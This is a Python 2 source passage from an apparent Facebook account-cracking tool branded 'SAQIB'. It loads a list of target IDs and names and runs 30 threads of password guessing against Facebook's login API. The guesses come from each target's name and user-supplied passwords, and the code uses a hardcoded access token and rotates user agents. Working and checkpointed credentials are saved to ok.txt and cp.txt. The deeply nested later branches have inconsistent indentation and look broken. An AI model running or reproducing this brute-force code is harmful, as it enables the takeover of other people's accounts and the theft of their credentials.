		pass8 = raw_input("[6] Password : ")
		print('\033[1;37m-------------------------------------------------')
		try:
			filelist = raw_input("[?] INPUT FILE NAME : \033[1;32m")
			for line in open(filelist , "r").readlines():
			    id.append(line.strip())
		except (KeyError,IOError):
			print("\t    \033[1;31mRequested file not found\033[0;37m")
			raw_input(" Press enter to back ")
			crack()
	elif select =="0":
	    menu()
	else:
		print("")
		print("\tSelect valid option\033[0;97m")
		print("")
		choice()
	print('\033[1;37m-------------------------------------------------')
	print("[$] Total IDs : \033[1;32m"+str(len(id)))
	print('\033[1;37m-------------------------------------------------')
	print("[~] The Process has started")
	print("[~] Press ctrl + z to stop")
	print('\033[1;37m-------------------------------------------------')
	def main(arg):
		user=arg
		uid,name=user.split("|")
		ranagent = random.choice(agents)
		session = requests.Session()
		session.headers.update({'User-Agent': ranagent})
		try:
			pass1 = name.lower()
			data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass1+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
			q = json.loads(data)
			if "access_token" in q:
				print("\033[1;31m[SAQIB-OK] "+uid+" | "+pass1+"\033[0;97m")
				ok = open("ok.txt", "a")
				ok.write(uid+"|"+pass1+"\n")
				ok.close()
				oks.append(uid+pass1)
			else:
				if "www.facebook.com" in q["error_msg"]:
					print("\033[1;32m[SAQIB-CP] "+uid+" | "+pass1+"\033[0;97m")
					cp = open("cp.txt", "a")
					cp.write(uid+"|"+pass1+"\n")
					cp.close()
					cps.append(uid+pass1)
				else:
					pass2 = name.lower().split(' ')[0] + name.lower().split(' ')[1] 
					data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass2+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
					q = json.loads(data)
					if "access_token" in q:
						print("\033[1;31m[SAQIB-OK] "+uid+" | "+pass2+"\033[0;97m")
						ok = open("ok.txt", "a")
						ok.write(uid+"|"+pass2+"\n")
						ok.close()
						oks.append(uid+pass2)
					else:
						if "www.facebook.com" in q["error_msg"]:
							print("\033[1;32m[SAQIB-CP] "+uid+" | "+pass2+"\033[0;97m")
							cp = open("cp.txt", "a")
							cp.write(uid+"|"+pass2+"\n")
							cp.close()
							cps.append(uid+pass2)
						else:
							pass3 = name.lower()+ pa3
							data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass3+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
							q = json.loads(data)
							if "access_token" in q:
								print("\033[1;31m[SAQIB-OK] "+uid+" | "+pass3+"\033[0;97m")
								ok = open("ok.txt", "a")
								ok.write(uid+"|"+pass3+"\n")
								ok.close()
								oks.append(uid+pass3)
							else:
								if "www.facebook.com" in q["error_msg"]:
									print("\033[1;32m[SAQIB-CP] "+uid+" | "+pass3+"\033[0;97m")
									cp = open("cp.txt", "a")
									cp.write(uid+"|"+pass3+"\n")
									cp.close()
									cps.append(uid+pass3)
								else:
									pass4 = name.lower()+ pa4
									data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass4+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
									q = json.loads(data)
									if "access_token" in q:
										print("\033[1;31m[SAQIB-OK] "+uid+" | "+pass4+"\033[0;97m")
										ok = open("ok.txt", "a")
										ok.write(uid+"|"+pass4+"\n")
										ok.close()
										oks.append(uid+pass4)
									else:
										if "www.facebook.com" in q["error_msg"]:
											print("\033[1;32m[SAQIB-CP] "+uid+" | "+pass4+"\033[0;97m")
											cp = open("cp.txt", "a")
											cp.write(uid+"|"+pass4+"\n")
											cp.close()
											cps.append(uid+pass4)
										else:
											data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass5+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
											q = json.loads(data)
											if "access_token" in q:
												print("\033[1;31m[SAQIB-OK] "+uid+" | "+pass5+"\033[0;97m")
												ok = open("ok.txt", "a")
												ok.write(uid+"|"+pass5+"\n")
												ok.close()
												oks.append(uid+pass5)
											else:
												if "www.facebook.com" in q["error_msg"]:
													print("\033[1;32m[SAQIB-CP] "+uid+" | "+pass5+"\033[0;97m")
													cp = open("cp.txt", "a")
													cp.write(uid+"|"+pass5+"\n")
													cp.close()
													cps.append(uid+pass5)
												else:
													data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass6+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
											        q = json.loads(data)
											        if "access_token" in q:
												        print("\033[1;31m[SAQIB-OK] "+uid+" | "+pass6+"\033[0;97m")
												        ok = open("ok.txt", "a")
												        ok.write(uid+"|"+pass6+"\n")
												        ok.close()
												        oks.append(uid+pass6)
											        else:
												        if "www.facebook.com" in q["error_msg"]:
													        print("\033[1;32m[SAQIB-CP] "+uid+" | "+pass6+"\033[0;97m")
													        cp = open("cp.txt", "a")
													        cp.write(uid+"|"+pass6+"\n")
													        cp.close()
													        cps.append(uid+pass6)
												        else:
													        data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass7+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
											                q = json.loads(data)
											                if "access_token" in q:
												                print("\033[1;31m[SAQIB-OK] "+uid+" | "+pass7+"\033[0;97m")
												                ok = open("ok.txt", "a")
												                ok.write(uid+"|"+pass7+"\n")
												                ok.close()
												                oks.append(uid+pass7)
											                else:
												                if "www.facebook.com" in q["error_msg"]:
													                print("\033[1;32m[SAQIB-CP] "+uid+" | "+pass7+"\033[0;97m")
													                cp = open("cp.txt", "a")
													                cp.write(uid+"|"+pass7+"\n")
													                cp.close()
													                cps.append(uid+pass7)
												                else:
													                data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass8+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
											                        q = json.loads(data)
											                        if "access_token" in q:
												                        print("\033[1;31m[SAQIB-OK] "+uid+" | "+pass8+"\033[0;97m")
												                        ok = open("ok.txt", "a")
												                        ok.write(uid+"|"+pass8+"\n")
												                        ok.close()
												                        oks.append(uid+pass8)
											                        else:
												                        if "www.facebook.com" in q["error_msg"]:
													                        print("\033[1;32m[SAQIB-CP] "+uid+" | "+pass8+"\033[0;97m")
													                        cp = open("cp.txt", "a")
													                        cp.write(uid+"|"+pass8+"\n")
													                        cp.close()
													                        cps.append(uid+pass8)
		except:
			pass
	p = ThreadPool(30)
	p.map(main, id)
	print('\033[1;37m-------------------------------------------------')
	print("[$] The process has been completed")
	print("[$] Total \033[1;32mOk\033[1;37m/\033[1;31mCp \033[1;37m: \033[1;32m"+str(len(oks))+"\033[1;37m/\033[1;31m"+str(len(cps)))
	print('\033[1;37m-------------------------------------------------')
	raw_input("Press enter to back ")
	menu()
if __name__ == '__main__':
	login()
